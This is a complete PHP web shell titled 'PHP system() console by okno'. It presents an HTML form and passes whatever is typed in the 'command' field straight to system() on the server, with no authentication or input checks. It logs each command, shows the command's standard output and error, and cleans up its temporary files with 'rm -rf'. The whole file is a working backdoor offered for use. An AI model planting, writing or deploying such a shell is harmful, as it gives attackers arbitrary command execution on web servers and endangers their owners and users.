<style type="text/css">
body,td,th {
	font-family: Courier New, Courier, monospace;
	font-size: 10px;
	color: #03F;
}
body {
	background-color: #000;
}
a:link {
	color: #03F;
}
a:visited {
	color: #03F;
}
a:hover {
	color: #03F;
}
a:active {
	color: #03F;
}
</style>
<?php
echo '<br>________________________________________<br><br>';
$script  = "shell.php";
$logfile = "log.log";
$stdout  = "shell.out";
$stderr  = "shell.err";
$tmp = "shell.tmp";
$cr = "<br>";
echo '<br>PHP system() console by okno - main@pawelzorzan.eu <br>';
// Primary Controls
if(!is_writable("."))
	die("Fatal Error : Deam! Check your permission in this dir!");
if(empty($command))
	exit;
echo '- <a href="'.$script.'?log=zero"> Clear Log File </a> <br>';
echo '- <a href="'.$script.'?log=view"> View Log File </a> <br>';
if ($log == view)
	system("cat $logfile");
if ($log == zero)
	system("rm -rf $logfile");
echo '
<form action="shell.php" method="post">
command#<br><input type="text" name="command" size="30"/>
<input type="submit" value="run"/>
</form>
';
// Logging System Command
$string = "$command<br>\n";
$log=fopen($logfile,"a");
fwrite($log,$string);
fclose($log);
// Output Stanard System
echo "<br>command: $command<br>";
$cmd = system("$command >shell.out 2>shell.err");
$openf=fopen($stdout,"r");
$openo=fopen($tmp,"a+");
while(!feof($openf)) {
	$line = str_replace("\n", "",fgets($openf, 4096));
	if ($line != $null) {
		$ok = $line . '' . $cr;
		fwrite($openo, $ok);
		fwrite($openo, "\n");
	}
}
fclose($openf);
fclose($openo);
echo "<br>Standard Output:<br>";
echo "<font color=white>";
system("cat shell.tmp");
echo "</font>";
// Stanard Error System
echo '<br>Standard Error:<br>';
system("rm -rf shell.tmp");
$openf=fopen($stderr,"r");
$openo=fopen($tmp,"a+");
while(!feof($openf)) {
	$line = str_replace("\n", "",fgets($openf, 4096));
	if ($line != $null) {
		$lm = $line . '' . $cr;
		fwrite($openo, $lm);
		fwrite($openo, "\n");
	}
}
fclose($openf);
fclose($openo);
echo '<font color=red>';
system("cat shell.tmp");
echo '</font>';
echo '<br><br>________________________________________<br>';
// Cleaning System
system("rm -rf shell.err");
system("rm -rf shell.out");
system("rm -rf shell.tmp");
?>